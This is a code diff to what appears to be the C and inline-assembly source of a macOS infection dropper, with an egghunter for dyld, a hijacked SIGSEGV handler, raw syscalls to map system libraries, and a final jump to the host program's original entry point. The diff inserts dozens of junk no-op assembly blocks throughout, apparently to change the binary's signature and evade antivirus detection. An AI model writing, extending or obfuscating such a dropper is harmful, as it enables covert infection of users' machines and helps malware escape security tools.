@@ -36,6 +36,7 @@
 #define	PROT_WRITE      0x02    // [MC2] pages can be written
 #define	MAP_SHARED      0x0001  // [MF|SHM] share changes
 
+
 //#define LOADER_DEBUG
 
 void dropperStart ()
@@ -47,7 +48,7 @@ void doExit ()
 {
 #ifdef WIN32
 	__asm__ __volatile__ {
-			xor		eax,eax
+		xor		eax,eax
 			push	eax
 			inc		eax
 			push	eax
@@ -102,8 +103,30 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 	int offset, symbolOffset, stringOffset, x86Offset, found;
 	unsigned int i, nfat;
 
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
+
 	offset = found = 0;
 	f_header = (struct fat_header *)imageBase;
+
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
 
 	offset += sizeof (struct fat_header);
 	nfat = SWAP_LONG (f_header->nfat_arch);
@@ -113,14 +136,50 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 	printf("[ii] nFatArch: %d\n", nfat);
 #endif
 
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
+
+
 	for (i = 0; i < nfat; i++)
 	{
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		f_arch = (struct fat_arch *)(imageBase + offset);
 		int cpuType = SWAP_LONG (f_arch->cputype);
-
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		if (cpuType == 0x7)
 			break;
-
+		__asm { 
+			mov eax, eax 
+				push ecx 
+				pop ecx 
+				mov ecx, ecx 
+		}
 		offset += sizeof (struct fat_arch);
 	}
 
@@ -128,9 +187,28 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 #ifdef LOADER_DEBUG
 	printf ("[ii] x86 offset: %x\n", x86Offset);
 #endif
-
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
 	offset = x86Offset;
 	mh_header = (struct mach_header *)(imageBase + offset); 
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
 	offset += sizeof (struct mach_header);
 
 #ifdef LOADER_DEBUG
@@ -143,6 +221,16 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 
 	for (i = 0; i < mh_header->ncmds; i++)
 	{
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		l_command = (struct load_command *)(imageBase + offset);
 
 #ifdef LOADER_DEBUG
@@ -151,12 +239,51 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 
 		if (l_command->cmd == LC_SEGMENT)
 		{
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
 			if (found)
 			{
+				__asm {
+					push eax
+						pop eax
+						mov eax, eax
+						add eax, 0
+						mov ebx, ebx
+						push ecx
+						mov ecx, ecx
+						pop ecx
+				}
 				offset += l_command->cmdsize;
+				__asm {
+					push eax
+						pop eax
+						mov eax, eax
+						add eax, 0
+						mov ebx, ebx
+						push ecx
+						mov ecx, ecx
+						pop ecx
+				}
 				continue;
 			}
-
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
 			seg_command = (struct segment_command *)(imageBase + offset);
 
 #ifdef LOADER_DEBUG
@@ -165,18 +292,63 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 
 			if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
 				found = 1;
+			__asm { 
+				mov eax, eax 
+					push ecx 
+					pop ecx 
+					mov ecx, ecx 
+			}
 		}
 		else if (l_command->cmd == LC_SYMTAB)
 		{
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
 			sym_command = (struct symtab_command *)(imageBase + offset);
 
 			if (found)
 				break;
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
 		}
-
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		offset += l_command->cmdsize;
 	}
 
+	__asm {
+		push eax
+			pop eax
+			mov eax, eax
+			add eax, 0
+			mov ebx, ebx
+			push ecx
+			mov ecx, ecx
+			pop ecx
+	}
 	symbolOffset = x86Offset + sym_command->symoff;
 	stringOffset = x86Offset + sym_command->stroff;
 
@@ -188,15 +360,61 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 
 	for (i = 0; i < sym_command->nsyms; i++)
 	{
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		sym_nlist = (struct nlist *)(imageBase + symbolOffset);
 		symbolOffset += sizeof (struct nlist);
-
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 		if (sym_nlist->n_un.n_strx == 0x0)
 		{
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
+
 			continue;
 		}
-
+		__asm { 
+			mov eax, eax 
+				push ecx 
+				pop ecx 
+				mov ecx, ecx 
+		}
 		symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
+
+		__asm {
+			push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+		}
 
 #ifdef LOADER_DEBUG_VERBOSE
 		printf ("[ii] SYMBOLFat: %s\n", symbolName);
@@ -209,6 +427,16 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 			printf ("[ii] SYMBOLFat: %s\n", symbolName);
 			printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
 #endif
+			__asm {
+				push eax
+					pop eax
+					mov eax, eax
+					add eax, 0
+					mov ebx, ebx
+					push ecx
+					mov ecx, ecx
+					pop ecx
+			}
 			return sym_nlist->n_value;
 		}
 	}
@@ -219,6 +447,7 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 unsigned int
 findSymbol_snow (byte *imageBase, unsigned int symbolHash)
 {
+	
 	struct mach_header *mh_header       = NULL;
 	struct load_command *l_command      = NULL; 
 	struct nlist *sym_nlist             = NULL; 
@@ -287,8 +516,8 @@ findSymbol_snow (byte *imageBase, unsigned int symbolHash)
 			return sym_nlist->n_value;
 		}
 	}
-
 	return -1;
+	
 }
 
 unsigned int
@@ -460,13 +689,13 @@ void *mapLibSystem()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-		mov eax, [fd]
+			mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-		xor eax, eax
-		mov al, 189
-		push eax
-		int 0x80
-		mov [err], eax
+			xor eax, eax
+			mov al, 189
+			push eax
+			int 0x80
+			mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -491,19 +720,19 @@ void *mapLibSystem()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-		mov DWORD PTR [esp+20], 0
-		mov eax, [fd]
+			mov DWORD PTR [esp+20], 0
+			mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-		mov DWORD PTR [esp+8], 1        // PROT_READ
-		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+			mov DWORD PTR [esp+8], 1        // PROT_READ
+			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-		mov DWORD PTR [esp], 0
-		xor eax, eax
-		mov al, 197
-		push eax
-		int 0x80
-		mov [address], eax
+			mov DWORD PTR [esp], 0
+			xor eax, eax
+			mov al, 197
+			push eax
+			int 0x80
+			mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -546,22 +775,22 @@ void *mapLibDyld()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x84
-		push 0x00000062
-		push 0x696c7964
-		push 0x2e646c79
-		push 0x6462696c
-		push 0x2f6d6574
-		push 0x7379732f
-		push 0x62696c2f
-		push 0x7273752f
-		mov edx, esp
-		push 0x0
-		push edx
-		xor eax, eax
-		mov al, 0x5
-		push eax
-		int 0x80
-		mov [fd], eax
+			push 0x00000062
+			push 0x696c7964
+			push 0x2e646c79
+			push 0x6462696c
+			push 0x2f6d6574
+			push 0x7379732f
+			push 0x62696c2f
+			push 0x7273752f
+			mov edx, esp
+			push 0x0
+			push edx
+			xor eax, eax
+			mov al, 0x5
+			push eax
+			int 0x80
+			mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -594,13 +823,13 @@ void *mapLibDyld()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-		mov eax, [fd]
+			mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-		xor eax, eax
-		mov al, 189
-		push eax
-		int 0x80
-		mov [err], eax
+			xor eax, eax
+			mov al, 189
+			push eax
+			int 0x80
+			mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -625,19 +854,19 @@ void *mapLibDyld()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-		mov DWORD PTR [esp+20], 0
-		mov eax, [fd]
+			mov DWORD PTR [esp+20], 0
+			mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-		mov DWORD PTR [esp+8], 1        // PROT_READ
-		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+			mov DWORD PTR [esp+8], 1        // PROT_READ
+			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-		mov DWORD PTR [esp], 0
-		xor eax, eax
-		mov al, 197
-		push eax
-		int 0x80
-		mov [address], eax
+			mov DWORD PTR [esp], 0
+			xor eax, eax
+			mov al, 197
+			push eax
+			int 0x80
+			mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -680,23 +909,23 @@ void *mapLibSystemC()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x88
-		push 0x00000062
-		push 0x696c7964
-		push 0x2e635f6d
-		push 0x65747379
-		push 0x7362696c
-		push 0x2f6d6574
-		push 0x7379732f
-		push 0x62696c2f
-		push 0x7273752f
-		mov edx, esp
-		push 0x0
-		push edx
-		xor eax, eax
-		mov al, 0x5
-		push eax
-		int 0x80
-		mov [fd], eax
+			push 0x00000062
+			push 0x696c7964
+			push 0x2e635f6d
+			push 0x65747379
+			push 0x7362696c
+			push 0x2f6d6574
+			push 0x7379732f
+			push 0x62696c2f
+			push 0x7273752f
+			mov edx, esp
+			push 0x0
+			push edx
+			xor eax, eax
+			mov al, 0x5
+			push eax
+			int 0x80
+			mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -729,13 +958,13 @@ void *mapLibSystemC()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-		mov eax, [fd]
+			mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-		xor eax, eax
-		mov al, 189
-		push eax
-		int 0x80
-		mov [err], eax
+			xor eax, eax
+			mov al, 189
+			push eax
+			int 0x80
+			mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -760,19 +989,19 @@ void *mapLibSystemC()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-		mov DWORD PTR [esp+20], 0
-		mov eax, [fd]
+			mov DWORD PTR [esp+20], 0
+			mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-		mov DWORD PTR [esp+8], 1        // PROT_READ
-		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+			mov DWORD PTR [esp+8], 1        // PROT_READ
+			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-		mov DWORD PTR [esp], 0
-		xor eax, eax
-		mov al, 197
-		push eax
-		int 0x80
-		mov [address], eax
+			mov DWORD PTR [esp], 0
+			xor eax, eax
+			mov al, 197
+			push eax
+			int 0x80
+			mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -815,24 +1044,24 @@ void *mapLibSystemK()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x92
-		push 0x00006269
-		push 0x6c79642e
-		push 0x6c656e72
-		push 0x656b5f6d
-		push 0x65747379
-		push 0x7362696c
-		push 0x2f6d6574
-		push 0x7379732f
-		push 0x62696c2f
-		push 0x7273752f
-		mov edx, esp
-		push 0x0
-		push edx
-		xor eax, eax
-		mov al, 0x5
-		push eax
-		int 0x80
-		mov [fd], eax
+			push 0x00006269
+			push 0x6c79642e
+			push 0x6c656e72
+			push 0x656b5f6d
+			push 0x65747379
+			push 0x7362696c
+			push 0x2f6d6574
+			push 0x7379732f
+			push 0x62696c2f
+			push 0x7273752f
+			mov edx, esp
+			push 0x0
+			push edx
+			xor eax, eax
+			mov al, 0x5
+			push eax
+			int 0x80
+			mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -865,13 +1094,13 @@ void *mapLibSystemK()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-		mov eax, [fd]
+			mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-		xor eax, eax
-		mov al, 189
-		push eax
-		int 0x80
-		mov [err], eax
+			xor eax, eax
+			mov al, 189
+			push eax
+			int 0x80
+			mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -896,19 +1125,19 @@ void *mapLibSystemK()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-		mov DWORD PTR [esp+20], 0
-		mov eax, [fd]
+			mov DWORD PTR [esp+20], 0
+			mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-		mov DWORD PTR [esp+8], 1        // PROT_READ
-		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+			mov DWORD PTR [esp+8], 1        // PROT_READ
+			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-		mov DWORD PTR [esp], 0
-		xor eax, eax
-		mov al, 197
-		push eax
-		int 0x80
-		mov [address], eax
+			mov DWORD PTR [esp], 0
+			xor eax, eax
+			mov al, 197
+			push eax
+			int 0x80
+			mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -940,6 +1169,7 @@ void labelTest ()
 
 void secondStageDropper (unsigned long args)
 {
+	
 	unsigned int fd;
 	hijack_context *h_context = (hijack_context *)&args; // "context" saved by pushad
 
@@ -973,39 +1203,41 @@ void secondStageDropper (unsigned long args)
 	__asm__ __volatile__ {
 		mov eax, [ebp+0x4]			// retaddr
 		sub eax, 0xD3				// infection base is 0xd3 bytes before retaddr
+
 		mov [infectionBase], eax	
 
 		jmp get_pc
 init:
 		pop eax
 		mov [sig_handler], eax
+
 		jmp l_out
 get_pc:
 		call init
 
-// this is weird, depending on some stars allignment the context's
-// offset changes and so we just scan the stack for a register we 
-// know it's not changed by the kernel(ebp)
+			// this is weird, depending on some stars allignment the context's
+			// offset changes and so we just scan the stack for a register we 
+			// know it's not changed by the kernel(ebp)
 sig_handler:
 		mov eax, esp
 sig_loop:
 		add eax, 0x4
-		cmp [eax], ebp
-		jne sig_loop
+			cmp [eax], ebp
+			jne sig_loop
 
-		add eax, 0x4
-		mov esp, eax
-		// now esp points to the faulting ESP value
-		// in the middle of the thread context
-	
-		sub [esp], 4		// make room for retaddr
-		mov eax, [esp]		
+			add eax, 0x4
+			mov esp, eax
+			// now esp points to the faulting ESP value
+			// in the middle of the thread context
+
+			sub [esp], 4		// make room for retaddr
+			mov eax, [esp]		
 
 		mov ebx, [esp+0xc]	// ebx == faulting EIP
-		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter
-		mov [eax], ebx		// save retaddr
-		
-		// restore registers & return back to the egghunter
+		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+			mov [eax], ebx		// save retaddr
+
+			// restore registers & return back to the egghunter
 		mov eax, [esp-0x1c]
 		mov ebx, [esp-0x18]
 		mov ecx, [esp-0x14]
@@ -1026,13 +1258,25 @@ l_out:
 	// install sig_handler
 	__asm__ __volatile__ {
 		lea eax, [sig]
-		push 0x0
-		push eax		// &sig
-		push 0xb		// SIGSEGV
-		mov eax, 0x2e	// SYS_sigaction
-		push eax
-		int 0x80
-		add esp, 0x10
+
+		mov eax, eax 
+			push ecx 
+			pop ecx 
+			mov ecx, ecx 
+
+			push 0x0
+			push eax		// &sig
+			push 0xb		// SIGSEGV
+
+			mov eax, eax 
+			push ecx 
+			pop ecx 
+			mov ecx, ecx 
+
+			mov eax, 0x2e	// SYS_sigaction
+			push eax
+			int 0x80
+			add esp, 0x10
 	}
 
 	// egghunter: scans for the first 0xfeedface from 
@@ -1041,12 +1285,12 @@ l_out:
 		mov eax, 0x8fe00000
 l_loop:
 		cmp DWORD PTR [eax], 0xfeedface
-		je found
-		add eax, 0x1000
-		cmp eax, 0x8fff1000
-		jne l_loop
-		mov DWORD PTR [dyldBaseAddress], 0x0
-		jmp l_break
+			je found
+			add eax, 0x1000
+			cmp eax, 0x8fff1000
+			jne l_loop
+			mov DWORD PTR [dyldBaseAddress], 0x0
+			jmp l_break
 found:
 		mov DWORD PTR [dyldBaseAddress], eax
 l_break:
@@ -1058,28 +1302,28 @@ l_break:
 	// open the file
 	__asm__ __volatile__ {
 		push 0x0
-		push 0x7473696c
-		push 0x702e6e6f
-		push 0x69737265
-		push 0x566d6574
-		push 0x7379532f
-		push 0x73656369
-		push 0x76726553
-		push 0x65726f43
-		push 0x2f797261
-		push 0x7262694c
-		push 0x2f6d6574
-		push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
-		mov eax, esp
+			push 0x7473696c
+			push 0x702e6e6f
+			push 0x69737265
+			push 0x566d6574
+			push 0x7379532f
+			push 0x73656369
+			push 0x76726553
+			push 0x65726f43
+			push 0x2f797261
+			push 0x7262694c
+			push 0x2f6d6574
+			push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
+			mov eax, esp
 
-		push 0x0
-		push eax
-		mov eax, 0x5
-		push eax
-		int 0x80
-		mov [file_handle], eax
+			push 0x0
+			push eax
+			mov eax, 0x5
+			push eax
+			int 0x80
+			mov [file_handle], eax
 
-		add esp, 0x40
+			add esp, 0x40
 	}
 
 	if(file_handle <= 0)
@@ -1088,17 +1332,17 @@ l_break:
 	// read file
 	__asm__ __volatile__ {
 		push 0x400
-		lea eax, [file_buffer]
+			lea eax, [file_buffer]
 		push eax
-		mov eax, [file_handle]
+			mov eax, [file_handle]
 		push eax
-		mov eax, 0x3
+			mov eax, 0x3
 
-		push eax
-		int 0x80
-		mov [read_len], eax
+			push eax
+			int 0x80
+			mov [read_len], eax
 
-		add esp, 0x10
+			add esp, 0x10
 	}
 
 	if(read_len <= 0)
@@ -1425,13 +1669,48 @@ OEP_CALL:
 			//
 			__asm__ __volatile__ {
 					mov eax, _eax
+	
+				push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+
 					mov ecx, _ecx
 					mov edx, _edx
+				
+				push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+
 					mov ebx, _ebx
 					mov esi, _esi
 					mov edi, _edi
 					mov esp, _esp
+					
+				push eax
+				pop eax
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+				push ecx
+				mov ecx, ecx
+				pop ecx
+
 					mov ebp, originalEP; 
+
+				mov eax, eax
+				add eax, 0
+				mov ebx, ebx
+
 					add ebp, 0x30	// start right where we left, FIXME: what about EP different from crtStart??
 					jmp ebp
 			}
